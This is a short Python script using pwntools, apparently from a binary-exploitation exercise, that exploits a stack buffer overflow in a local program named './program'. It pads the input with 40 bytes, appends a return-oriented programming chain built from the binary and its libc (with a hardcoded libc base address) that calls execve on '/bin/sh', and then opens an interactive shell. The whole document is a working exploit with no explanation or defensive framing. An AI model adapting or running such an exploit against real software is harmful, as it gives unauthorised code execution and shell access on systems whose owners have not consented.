from pwn import *

p = process("./program")
elf = context.binary = ELF("./program")
libc = elf.libc
rop = ROP([elf,libc])
context.kernel = 'amd64'

libc.address = 0x00007ffff7dd2000
binsh = next(libc.search(b"/bin/sh"))
rop.execve(binsh,0,0)

payload = b"A" * 40
payload += bytes(rop)


print(rop.dump())
p.sendline(payload)
p.interactive()
